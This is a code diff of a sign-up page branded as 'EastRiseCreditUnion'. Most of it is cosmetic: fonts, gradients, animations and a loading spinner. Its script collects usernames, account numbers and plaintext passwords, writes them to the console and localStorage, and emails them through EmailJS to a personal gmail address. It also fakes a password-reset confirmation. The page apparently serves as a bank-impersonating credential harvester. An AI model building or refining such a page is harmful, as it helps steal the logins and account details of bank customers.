@@ -3,17 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>EastRiseCreditUnion</title>
+  <title>EastRiseCreditUnion - Sign Up</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Segoe UI', Arial, sans-serif;
+      font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
     }
 
     body {
-      background-color: #f0f2f5;
+      background: linear-gradient(135deg, #f0f2f5 0%, #e0e7ff 100%);
       display: flex;
       flex-direction: column;
       min-height: 100vh;
@@ -32,35 +33,53 @@
       background-color: #ddd;
     }
 
+    .logo-container {
+      text-align: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .logo {
+      width: 100px;
+      height: auto;
+      transition: transform 0.3s ease;
+    }
+
+    .logo:hover {
+      transform: scale(1.1);
+    }
+
     .container {
       display: flex;
       justify-content: center;
       align-items: stretch;
       padding: 20px;
       flex: 1;
-      max-width: 1200px;
+      max-width: 1600px;
       margin: 0 auto;
     }
 
     .form-container {
-      background-color: rgba(255, 255, 255, 0.95);
+      background-color: rgba(255, 255, 255, 0.98);
       padding: 2rem;
-      border-radius: 10px;
-      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
+      border-radius: 15px;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
       width: 100%;
       max-width: 400px;
       transition: all 0.3s ease;
       margin-right: 20px;
+      animation: fadeIn 1s ease-in-out;
     }
 
     .image-container {
-      width: 900px;
+      width: 100%;
+      max-width: 900px;
       display: flex;
     }
 
     .right-image {
-      width: 700px;
-      height: 500px;
+      width: 100%;
+      max-width: 900px;
+      height: 600px;
     }
 
     .heading {
@@ -126,22 +145,44 @@
       justify-content: center;
       width: 100%;
       padding: 0.8rem;
-      background-color: #f5a623;
+      background: linear-gradient(90deg, #f5a623, #e6951c);
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       color: white;
       font-size: 1rem;
       font-weight: 600;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 10px rgba(245, 166, 35, 0.3);
+      position: relative;
     }
 
     .signup-btn:hover {
-      background-color: #e6951c;
+      background: linear-gradient(90deg, #e6951c, #d48415);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(245, 166, 35, 0.4);
     }
 
     .signup-btn svg {
       margin-left: 8px;
+    }
+
+    .signup-btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .loading {
+      display: none;
+      position: absolute;
+      right: 10px;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #fff;
+      border-top: 3px solid #f5a623;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
     }
 
     .links {
@@ -170,7 +211,7 @@
       width: 100%;
       padding: 0.8rem;
       border: 2px solid #f5a623;
-      border-radius: 6px;
+      border-radius: 8px;
       color: #1a1a1a;
       text-decoration: none;
       font-size: 0.9rem;
@@ -179,8 +220,9 @@
     }
 
     .login-btn:hover {
-      background-color: #f5a623;
+      background: linear-gradient(90deg, #f5a623, #e6951c);
       color: white;
+      box-shadow: 0 4px 10px rgba(245, 166, 35, 0.3);
     }
 
     .login-btn svg {
@@ -210,10 +252,11 @@
     .modal-content {
       background-color: white;
       padding: 2rem;
-      border-radius: 10px;
+      border-radius: 15px;
       width: 100%;
       max-width: 400px;
       box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
+      animation: fadeIn 0.3s ease-in-out;
     }
 
     .modal-content h2 {
@@ -226,6 +269,28 @@
       float: right;
       font-size: 1.5rem;
       cursor: pointer;
+      color: #333;
+      transition: color 0.3s ease;
+    }
+
+    .close-btn:hover {
+      color: #f5a623;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
 
     @media (max-width: 1200px) {
@@ -243,12 +308,16 @@
 
       .image-container {
         width: 100%;
-        max-width: 500px;
+        max-width: 700px;
       }
 
       .right-image {
         width: 100%;
         height: 300px;
+      }
+
+      .signup-header-img {
+        max-height: 100px;
       }
     }
 
@@ -263,7 +332,7 @@
       }
 
       .signup-header-img {
-        max-height: 100px;
+        max-height: 80px;
       }
     }
 
@@ -286,12 +355,16 @@
       }
 
       .signup-header-img {
-        max-height: 80px;
+        max-height: 60px;
       }
 
       .modal-content {
         width: 90%;
         padding: 1.5rem;
+      }
+
+      .logo {
+        width: 80px;
       }
     }
   </style>
@@ -303,7 +376,6 @@
     <div class="container">
       <div class="form-container">
         <h2 class="heading">Sign Up</h2>
-       
         <form id="signup-form">
           <div class="form-group">
             <label for="username" class="label">
@@ -352,11 +424,12 @@
               </span>
             </div>
           </div>
-          <button type="submit" class="signup-btn">
+          <button type="submit" class="signup-btn" id="signup-btn">
             Sign Up
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <path d="M9 5l7 7-7 7"></path>
             </svg>
+            <span class="loading" id="loading-indicator"></span>
           </button>
           <div class="links">
             <span class="link" id="forgot-password">Forgot your password?</span>
@@ -409,6 +482,8 @@
     const passwordInput = document.getElementById('password');
     const passwordToggle = document.getElementById('password-toggle');
     const eyeIcon = document.getElementById('eye-icon');
+    const signupBtn = document.getElementById('signup-btn');
+    const loadingIndicator = document.getElementById('loading-indicator');
 
     passwordToggle.addEventListener('click', () => {
       const isPassword = passwordInput.type === 'password';
@@ -420,30 +495,59 @@
 
     // Function to send emails to user and admin
     async function sendSignupEmails(username, email, accountNo, password) {
-      try {
-        // Send email to user
-        const userResponse = await emailjs.send("service_pfpncmc", "template_x3pgxj9", {
-          to_email: email,
-          username: username,
-          password: password,
-          account_no: accountNo
-        });
-        console.log('Email sent to user successfully:', userResponse);
+      const serviceID = "service_pfpncmc"; // Replace with your actual EmailJS Service ID
+      const templateID = "template_x3pgxj9"; // Replace with your actual EmailJS Template ID
+      const adminEmail = "unnatidaksha@gmail.com"; // Replace with your actual admin email
 
-        // Send email to admin
-        const adminResponse = await emailjs.send("service_pfpncmc", "template_x3pgxj9", {
-          to_email: "unnatidaksha@gmail.com",
-          username: username,
-          user_email: email,
-          password: password,
-          account_no: accountNo
-        });
-        console.log('Email sent to admin successfully:', adminResponse);
+      // Log the data being sent for debugging
+      console.log('Sending email with data:', {
+        username,
+        email,
+        accountNo,
+        password,
+        adminEmail
+      });
+
+      try {
+        // Send emails in parallel
+        const [userResponse, adminResponse] = await Promise.all([
+          emailjs.send(serviceID, templateID, {
+            to_email: email,
+            username: username,
+            password: password,
+            account_no: accountNo,
+            to_name: username // Added for better template compatibility
+          }).catch(err => ({ status: 'error', error: err })),
+          emailjs.send(serviceID, templateID, {
+            to_email: adminEmail,
+            username: username,
+            user_email: email,
+            password: password,
+            account_no: accountNo,
+            to_name: 'Admin' // Added for better template compatibility
+          }).catch(err => ({ status: 'error', error: err }))
+        ]);
+
+        // Check responses
+        if (userResponse.status === 'error') {
+          console.error('User email failed:', userResponse.error);
+          alert('Failed to send email to user. Please check your email address and try again.');
+          return false;
+        } else {
+          console.log('Email sent to user successfully:', userResponse);
+        }
+
+        if (adminResponse.status === 'error') {
+          console.error('Admin email failed:', adminResponse.error);
+          alert('Failed to send email to admin. Signup completed, but admin was not notified.');
+        } else {
+          console.log('Email sent to admin successfully:', adminResponse);
+        }
 
         return true;
       } catch (error) {
         console.error('Error sending emails:', error);
-        alert(`Failed to send emails: ${error.status || 'Unknown status'} - ${error.text || 'Unknown error'}`);
+        alert(`Failed to send emails: ${error.message || 'Unknown error'}`);
         return false;
       }
     }
@@ -451,17 +555,22 @@
     // Signup form submission handling
     document.getElementById('signup-form').addEventListener('submit', async function (event) {
       event.preventDefault();
+
+      // Show loading state
+      signupBtn.disabled = true;
+      loadingIndicator.style.display = 'inline-block';
+
       const username = document.getElementById('username').value;
       const email = document.getElementById('email').value;
       const accountNo = document.getElementById('account-no').value;
       const password = document.getElementById('password').value;
 
       // Log stored data for debugging
-      console.log('Stored data:', {
-        username: username,
-        email: email,
-        accountNo: accountNo,
-        password: password
+      console.log('Form data:', {
+        username,
+        email,
+        accountNo,
+        password
       });
 
       // Store credentials in localStorage
@@ -472,6 +581,11 @@
 
       // Send emails
       const emailSent = await sendSignupEmails(username, email, accountNo, password);
+
+      // Hide loading state
+      signupBtn.disabled = false;
+      loadingIndicator.style.display = 'none';
+
       if (emailSent) {
         // Redirect to thank-you page
         window.location.href = 'thankspage.html';
@@ -495,6 +609,15 @@
       if (event.target === modal) {
         modal.style.display = 'none';
       }
+    });
+
+    // Reset Password Form Submission (Placeholder)
+    document.getElementById('reset-password-form').addEventListener('submit', function (event) {
+      event.preventDefault();
+      const resetEmail = document.getElementById('reset-email').value;
+      console.log('Reset password requested for:', resetEmail);
+      alert('Reset link sent to ' + resetEmail + '. Please check your email.');
+      modal.style.display = 'none';
     });
   </script>
 </body>
